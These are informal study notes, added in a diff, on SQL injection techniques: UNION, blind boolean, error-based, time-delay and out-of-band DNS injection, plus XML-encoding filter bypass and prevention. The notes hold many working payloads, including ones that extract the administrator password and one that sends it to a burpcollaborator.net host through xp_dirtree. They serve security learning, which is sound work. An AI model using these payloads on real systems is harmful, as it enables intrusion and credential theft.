@@ -1,0 +1,224 @@
+you know what sql injection (sqli) is 
+
+in some case can lead to 
+  compromise the server or back-end or Dos attack
+
+OAST
+  out-of-band application security testing 
+
+detecting sqli vulnerabilities 
+  use a systemic test against every entry point
+    a single ' and look for differences
+    some SQL-specific syntax that evaluates to the base value of the entry 
+      and look for differences
+    OR 1=1, OR 1=2 and look for differences
+    time delay payload, and look for time differences
+    OAST payload to trigger out-of-band network interaction, and monitor resulting interaction
+    or use burp scanner 
+
+where can it be found 
+  within WHERE clause of SELECT
+  UPDATE. within updated value or WHERE clause
+  INSERT. within inserted value 
+  SELECT. within table or column name. or ORDER BY clause
+
+database-specific syntax 
+  https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+retrieving hidden data 
+  ex. shopping application send request to https://insecure-website.com/products?category=Gifts
+    which cause the application to make the sql query 
+    SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+      everything from products table where category is Gifts and released is 1
+      can be assume that unreleased products is 0 
+    the application dont prevent sqli so 
+      https://insecure-website.com/products?category=Gifts'-- 
+      SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+        -- is comment in sql 
+    or display products from every category
+      https://insecure-website.com/products?category=Gifts'+OR+1=1-- 
+      SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+        select products where either category is Gifts or 1 = 1
+
+  take care when injecting OR 1=1 
+    it's common for applications to use data from a single request in multiple different queries.
+    If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data. 
+
+subverting application logic 
+  you better sanitize the input when login by checking sql
+    SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+      but this require knowing the username 
+
+union attack
+  almost allow attacker to create any query. only limited by the original query columns and data type.
+
+  when the application is vulnerable to sqli and the result are returned within the application response
+  require each query to return the same number of columns 
+    data types in each column must be compatible between each query
+    knowing the actual sql use is extremely helpful for this 
+      got it by using a single ' (in error-based sqli)
+  use UNION to retrieve data from other table within the database
+    UNION allow you to do one or more additional SELECT 
+  SELECT a, b FROM table1 UNION SELECT c, d FROM table2
+    return with 2 columns. a,b from table1 and c,d from table2 
+  testing before an attack 
+    baker')) UNION SELECT 1,2,3,4,5,6,7,8,9 from USERS--
+  an attack   
+    baker')) UNION SELECT username,email,3,4,5,6,7,8,9 from USERS-- 
+
+  determining the number of columns required 
+    1.injecting ' ORDER BY 1--   
+      keep incrementing the number until error 
+    2.injecting ' UNION SELECT NULL--    ' UNION SELECT NULL,NULL-- 
+      and so on until database return an additional row containing null values in each column 
+      (NULL is compatible with every common data types)
+      (this method is more accurate??)
+
+  finding columns with useful data type 
+    interesting data is usually a string, meaning you need to find column in the original query that is compatible with string 
+    after knowing the amount of required columns, test by 
+      ' UNION SELECT 'a',NULL,NULL,NULL--
+      ' UNION SELECT NULL,'a',NULL,NULL--    and so on.
+      no error mean compatible
+
+  retrieve interesting data 
+    require original query have columns to hold string and the input is within WHERE clause
+    ex. database have a table called users with columns username and password
+      ' UNION SELECT username, password FROM users-- 
+
+  retrieving multiple values in the same column 
+    by concatenating the values together
+    || is concat in Oracle, 
+
+    ex. query has one column 
+    ' UNION SELECT username || '~' || password FROM users--
+
+Examining the database 
+  type and version 
+    microsoft, MySQL  SELECT @@version
+    Oracle            SELECT * FROM v$version
+    PostgeSQL         SELECT version()
+    ex. ' UNION SELECT @@version-- 
+
+  listing content of the database 
+    SELECT * FROM information_schema.tables
+      to list every table in the database 
+    SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+      to query table based on information_schema 
+
+    for Oracle 
+      SELECT * FROM all_tables
+      SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' 
+
+blind sqli 
+  when the application is vulnerable to sqli but the HTTP response dont contain result from the query or any database error 
+  many technique such as UNION dont work with blind sqli 
+
+  blind sqli by triggering conditional response
+    ex. an application use tracking cookies. when checking it's use SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+      its vulnerable to sqli but no returned query to user. but the application behave differently if the query return data 
+        …xyz' AND '1'='1
+        …xyz' AND '1'='2
+          the first make the "welcome back" message display.
+          this allowed us to determine the answer to any single injected condition  
+    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+      "welcome back" mean the first character of the password is greater than m 
+    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+
+  ' AND (SELECT 'a' FROM users LIMIT 1)='a
+  ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+  ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+  ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+
+  fnwrd3b0h4avp8wkedk9
+
+error-based sqli 
+  sqli where you can read or use the error messages 
+  may be able to get a specific error based on the result of a boolean expression, like blind with conditional.
+  may be able to get an error that return the data from query, turning blind into visible one. 
+
+  blind sqli by triggering conditional error 
+    if the application behavior dont change whether or not the query return data, you cant use blind
+      its possible to use error-based to make it return a different response when sql error 
+      you can causes database error only if the query condition is true
+        often an unhandled error change the application response
+      xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+      xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+        first one is a=a 
+        second one is 1/0 error 
+      xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+        if the first letter of password > m, 1/0 error. 
+
+''
+'||(SELECT '')||'
+'||(SELECT '' FROM dual)||'
+'||(SELECT '' FROM not-a-real-table)||'
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+nps1uqvaduhosvpwa1x81  password not wrong but something is 
+
+  verbose sql error messages 
+    misconfiguration of the database sometimes result in verbose error messages
+      Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
+    maybe making error messages that contains some data from query, turning blind into visible 
+      CAST((SELECT example_column FROM example_table) AS int)
+        casting into incompatible type will get. (ex. string to int)
+      ERROR: invalid input syntax for type integer: "Example data"
+        useful if a character limit prevent conditional response
+
+  blind sqli by triggering time delay 
+    if the application catches database error, conditional error wont work 
+      in this case its often possible to blind sqli with time delay depending on if an injected condition is true or false 
+        because normally sql query are process synchronously 
+      delaying the execution of sql query will delay HTTP response
+    the technique used is specific to the database used
+      ex. on microsoft sql server 
+        '; IF (1=2) WAITFOR DELAY '0:0:10'--
+        '; IF (1=1) WAITFOR DELAY '0:0:10'--
+          the second one delay by 10 seconds because 1=1 
+        '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+  
+  blind sqli using OAST technique
+    if the application catches database error and process query asynchronously. 
+      in this case its often possible to use sqli by triggering out-of-band network interaction to system you control  
+        1.use trigger based on injected condition to infer information 
+        2.extract data directly within network interaction 
+      a variety of network protocol can be used, typically its DNS. most network allow all DNS query.
+    OAST is a powerful way to do blind sqli because of the high success rate and the ability to extract data directly
+
+    triggering a DNS query is specific to database type 
+      ex. '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+
+    you can then use out-of-band interactions to extract data directly
+      '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree 
+      "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+
+      and there will be a loopup for the subdomain S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
+        S3cure is the password 
+
+sqli in different context 
+  previously we inject sql in the query string, but we can inject anywhere that is process as a sql query 
+    some website take JSON and XML as input and use it to query database 
+  These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked by defense mechanisms.
+  weak implementation often look for common sqli keyword, so you may bypass it by encoding or escaping character in the keyword 
+    ex. XML based sqli, use XML escape sequence to encode the S in SELECT 
+      <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+      this will be decoded server-side before passing to sql interpreter
+
+second order sqli (stored sqli) 
+  first order sqli is when the application process put user input in sql query in unsafe way 
+  second order sqli is when the application store user input for future use 
+
+  no vulnerabilities happen when the input is stored, later handling a different HTTP request the application retrieve the stored data 
+    and put it in a sql query in an unsafe way.
+
+preventing sqli 
+  parameterized query (prepared statements) instead of string concatenation 
+  you can use parameterized query any where there is untrusted input 
+    the string inside parameterized query must be hard-coded to be effective, no variable
+  whitelisting permitted input values 
+  using different logic to deliver the required behavior
